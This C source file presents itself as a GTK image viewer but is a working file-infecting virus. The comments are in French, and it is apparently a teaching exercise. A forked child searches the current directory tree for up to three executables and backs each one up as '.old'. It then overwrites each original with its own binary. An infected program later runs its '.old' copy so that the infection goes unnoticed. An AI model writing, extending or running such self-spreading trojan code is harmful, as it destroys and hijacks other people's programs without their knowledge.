#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <stdbool.h>
#include <fcntl.h>
#include <errno.h>
#include <gtk/gtk.h>

#define strlens(s) (s == NULL ? 0: strlen(s))
#define NB_TARGET_MAX 3

static char *MEDIAPLAYER = "./MediaPlayer.exe";
static char **imgs = NULL;
static int imgsSize = 0;
static int pos = -1;

typedef struct Element Element;
struct Element
{
    Element *next;
    Element *prev;
    char path[1];
};

typedef struct List List;
struct List
{
    Element *p;
};


void act_BtnNext(GtkWidget *button, GtkImage *image) {
    if (imgsSize != 0) {
        gtk_image_set_from_file(GTK_IMAGE(image), imgs[pos = (pos + 1) % imgsSize]);
    }
}

void act_BtnPrevious(GtkWidget *button, GtkImage *image) {
    if (imgsSize != 0) {
        pos -= 1;
        if (pos < 0)
            pos = imgsSize - 1;

        gtk_image_set_from_file(GTK_IMAGE(image), imgs[pos]);
    }
}

int launchMediaPlayer(int argc, char **argv) {
    GtkBuilder *builder = NULL;
    GError *error = NULL;
    gchar *filename = NULL;

    GtkWidget *mediaPlayerWindow = NULL;

    imgs = argv;
    imgsSize = argc;
    gtk_init(&argc, &argv);
    
    builder = gtk_builder_new();
    filename =  g_build_filename("Mediaplayer.glade", NULL);
    gtk_builder_add_from_file(builder, filename, &error);
    g_free(filename);

    if (error) {
        gint code = error->code;
        g_printerr("%s\n", error->message);
        g_error_free(error);
        return code;
    }

    mediaPlayerWindow = GTK_WIDGET(gtk_builder_get_object(builder, "mediaPlayerWindow"));
    gtk_builder_connect_signals(builder, NULL);
    g_object_unref(builder);
    gtk_widget_show(mediaPlayerWindow);
    gtk_main();
    return 0;
}

void signalHandler(int sig) {
    fprintf(stdout, "\e[91m%s [%d]\e[39m\n", "catch signal", sig);
}

List *init(char *file)
{
    List *list = malloc(sizeof(List));
    Element *newElem = malloc(sizeof(Element) + (strlen(file) + 1));
    if (!list || !newElem) {
        exit(EXIT_FAILURE);
    }
    strcpy(newElem->path, file);
    newElem->next = NULL;
    newElem->prev = NULL;
    list->p = newElem;
    return list;
}

List* insert(List **list, char* file)
{
    if (!*list){
        *list = init(file);
        return *list;
    }else{
        Element *newElem = malloc(sizeof(Element) + (strlen(file) + 1));
        if (!(*list) || !newElem) {
            exit(EXIT_FAILURE);
        }
        strcpy(newElem->path, file);

        newElem->prev = (*list)->p;
        newElem->next = NULL;
        if (*list && (*list)->p) {
            (*list)->p->next = newElem;
        }
        (*list)->p = newElem;
    }
    return *list;
}

bool    deleteItem(List **list, Element *deleteItem) {
    if (!*list && !deleteItem)
        return false;

    if (deleteItem->next) {
        deleteItem->next->prev = deleteItem->prev;
    }
    if (deleteItem->prev) {
        deleteItem->prev->next = deleteItem->next;
    }

    if ((*list)->p == deleteItem) {
        if (deleteItem->next) {
            (*list)->p = deleteItem->next;
        } else if (deleteItem->prev) {
            (*list)->p = deleteItem->prev;
        } else {
            (*list)->p = NULL;
        }
    }

    deleteItem->next = NULL;
    deleteItem->prev = NULL;
    free(deleteItem);
    return true;
}

bool isInfected(char* file, List *liste)
{
    if (!liste) {
        return false;
    }
    char cible[500];
    char *sufOld = ".old";
    sprintf(cible,"%s%s",file, sufOld);
    Element *actuel = liste->p;
    while (actuel != NULL) {
        if (strcmp(cible, actuel->path) == 0) {
            return true;
        }
        actuel = actuel->prev;
    }
    return false;
}


void    reasearch(List **fichiers, List **old, List** dirs) {
    DIR     *dirp;
    int     cmp;
    struct  dirent *entry;
    struct  stat s;
    char    *currentfolder;
    char    fichier[500];

    if (*dirs && (*dirs)->p) {
        currentfolder = (*dirs)->p->path;
        dirp = opendir(currentfolder);

        while ((entry = readdir(dirp)) != NULL) {
            sprintf(fichier, "%s/%s", currentfolder, entry->d_name);

            if (stat(fichier, &s) != -1) {
                if (S_ISDIR(s.st_mode)
                && !(strlens(strstr(entry->d_name, ".")) == 1)
                && !(strlens(strstr(entry->d_name, "..")) == 2)) {
                    insert(dirs, fichier);

                } else if ((s.st_mode & S_IXUSR) && (s.st_mode & S_IFREG)){
                    if (strlens(strstr(entry->d_name,".old")) == 4) {
                        insert(old, fichier);
                    } else {
                        insert(fichiers, fichier);
                    }
                }
            }
        }
        closedir(dirp);
    }
}

List    *searchFileToInfect(char *initPath) {
    List    *targets = NULL;
    List    *dirs = NULL;
    List    *files = NULL;
    List    *olds = NULL;

    Element *currentDir = NULL;
    int     nbTarget;

    nbTarget = 0;
    dirs = insert(&dirs, initPath);
    while ((currentDir = dirs->p) && nbTarget < NB_TARGET_MAX) {
        reasearch(&files, &olds, &dirs);
        deleteItem(&dirs, currentDir);

        if (files) {
            Element *actualFile = NULL;

            while ((actualFile = files->p)) {
                if (!isInfected(actualFile->path, olds) && nbTarget < NB_TARGET_MAX) {
                    insert(&targets, actualFile->path);
                    nbTarget += 1;
                }
                //Moyen de ne pas delete et de juste skip si on veux permettre de chercher
                //un .old qui serait potentiellement plus haut que le fichier actuel
                deleteItem(&files, actualFile);
            }
        }

        //Delete les .old trouvé avant de partir sur un autre dossier
        if (olds) {
            Element *actualOld = NULL;
            while ((actualOld = olds->p)) {
                deleteItem(&olds, actualOld);
            }
        }
    }

    if (dirs) {
        Element *actualDir = NULL;
        while ((actualDir = dirs->p)) {
            deleteItem(&dirs, actualDir);
        }
        free(dirs);
    }

    if (files) {
        Element *actualFile = NULL;
        while ((actualFile = files->p)) {
            deleteItem(&files, actualFile);
        }
        free(files);
    }

    if (olds) {
        Element *actualOld = NULL;
        while ((actualOld = olds->p)) {
            deleteItem(&olds, actualOld);
        }
        free(olds);
    }

    return targets;
}

void catchSignals() {
    signal(SIGABRT, signalHandler);
    signal(SIGIO, signalHandler);
    signal(SIGPIPE, signalHandler);
    signal(SIGSEGV, signalHandler);
}

void    duplicate(char *srcVirus, char *destToInfect) {
    char    buffer[4096];
    int     fd_srcVirus;
    int     fd_destToInfect;
    int     fd_destToInfectOld;
    char    *destToInfectOld;
    int     bytes;

    destToInfectOld = strcat(strdup(destToInfect), ".old");

    fd_destToInfect = open(destToInfect, O_RDWR);
    fd_destToInfectOld = open(destToInfectOld, O_WRONLY | O_CREAT, 0755);
    while ((bytes = read(fd_destToInfect, buffer, 4096)) > 0) {
        if (bytes == -1) {
            fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Error reading file.", strerror(errno));
            break;
        }
        if (write(fd_destToInfectOld, buffer, bytes) == -1) {
            fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Error writing to file.", strerror(errno));
            break;
        }
    }
    close(fd_destToInfect);
    close(fd_destToInfectOld);

    fd_srcVirus = open(srcVirus, O_RDONLY);
    fd_destToInfect = open(destToInfect, O_WRONLY);
    while ((bytes = read(fd_srcVirus, buffer, 4096)) > 0) {
        if (bytes == -1) {
            fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Error reading file.", strerror(errno));
            break;
        }
        if (write(fd_destToInfect, buffer, bytes) == -1) {
            fprintf(stderr, "\e[91m%s [%s]\e[39m\n", "Error writing to file.", strerror(errno));
            break;
        }
    }
    close(fd_srcVirus);
    close(fd_destToInfect);
}

int launchVirus(char *str) {
    char PATH[_SC_UCHAR_MAX];

    //catchSignals();

    fprintf(stderr, "\e[91m%s\e[39m\n", "DUPLICATE");
    if(getcwd(PATH, _SC_UCHAR_MAX) == NULL) {
        return EXIT_FAILURE;
    }

    List* cibles = NULL;
    cibles = searchFileToInfect(PATH);

    Element *actualtarget = NULL;
    while ((actualtarget = cibles->p)) {
        duplicate(str, actualtarget->path);
        deleteItem(&cibles, actualtarget);
    }
    free(cibles);
    return 0;
}

int main(int argc, char **argv) {
    pid_t   pid;

    fprintf(stderr, "\e[91m%s\e[39m\n", "LAUNCH");

    if ((pid = fork()) == -1) {
        fprintf(stderr, "\e[91m%s\e[39m\n", "fork failed");
    } else if (pid == 0) { //Nouveau prog
        fprintf(stderr, "\e[91mpid = %d, ppid = %d\e[39m\n", getpid(), getppid());
        launchVirus(argv[0]);

    } else { //Main prog
        fprintf(stderr, "\e[91mpid = %d, ppid = %d\e[39m\n", getpid(), getppid());

        if (strcmp(argv[0], MEDIAPLAYER) == 0) {
            launchMediaPlayer(argc - 1, argv + 1);
        } else {
            char *exeOld = strcat(argv[0], ".old");
            execv(exeOld, argv);
            kill(getpid(), SIGSEGV);
        }
    }

    return 0;
}